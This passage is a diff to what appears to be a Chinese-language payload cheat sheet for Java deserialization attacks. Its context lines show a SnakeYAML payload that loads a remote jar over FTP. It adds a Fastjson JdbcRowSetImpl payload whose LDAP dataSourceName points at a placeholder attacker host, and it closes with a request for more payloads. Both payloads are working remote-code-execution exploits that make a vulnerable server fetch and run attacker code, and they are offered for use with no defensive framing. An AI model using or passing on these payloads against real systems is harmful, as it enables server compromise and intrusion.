@@ -63,7 +63,21 @@ ftp 可以换为HTTP 及其他支持协议
 ```
 !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["ftp://127.0.0.1:8000/yaml-payload4.jar"]]]]
 ```
+## Fastjson
 
+```
+{
+    "a":{
+        "@type":"java.lang.Class",
+        "val":"com.sun.rowset.JdbcRowSetImpl"
+    },
+    "b":{
+        "@type":"com.sun.rowset.JdbcRowSetImpl",
+        "dataSourceName":"ldap://xx.xx.xx.xx:9102/123",
+        "autoCommit":true
+    }
+}
+```
 
 ------------------------------------------------------------------------------------
 各位师傅有建议及其他Payload 带带弟弟啊
